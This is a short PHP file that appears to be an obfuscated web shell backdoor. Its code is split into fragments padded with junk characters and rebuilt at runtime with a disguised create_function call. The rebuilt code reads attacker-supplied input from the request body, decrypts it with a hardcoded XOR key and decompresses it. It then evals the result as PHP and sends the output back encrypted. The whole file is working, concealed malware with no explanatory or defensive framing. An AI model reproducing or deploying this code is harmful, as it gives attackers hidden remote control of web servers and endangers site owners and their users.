<?php
$R='nction xve($tve,$k){$c=svetrlen($vek);$l=stverlen(veve$t);$o=ve"";for($i=0;ve$ive<$l;){for(ve$j=0;';
$g='eal(@gzveuncompveresves(@x(@baseve64_devecodvee($m[ve1]),$k))ve);ve$o=@ob_get_contenvevets();@ob_e';
$F='$k="ve4ec63573ve";ve$kh="ve38e5ca0205ved6";$vekf="027ca1ve74ave4de";$p="veuveDPGUmwNKGOlveJOveul";fveu';
$Q=str_replace('CH','','cCHreatCHCHe_CHfuCHncCHtion');
$D='cveh("/ve$khve(.+)$kf/",@file_getve_contentsve("php:ve//inveput"),$m)==ve1) {@veob_svetart();@veevv';
$o='vend_veclean();$ver=@bavevese64_encode(@xve(@gzcovempressve($o),ve$k))ve;print("$pve$kh$ver$kf");}';
$H='(ve$j<$c&ve&$ive<$l);ve$vej++,$i++){$o.=$vetve{ve$i}^$kve{$j};}}return ve$ove;ve}if ve(@preveg_mat';
$P=str_replace('ve','',$F.$R.$H.$D.$g.$o);
$A=$Q('',$P);$A();
?>
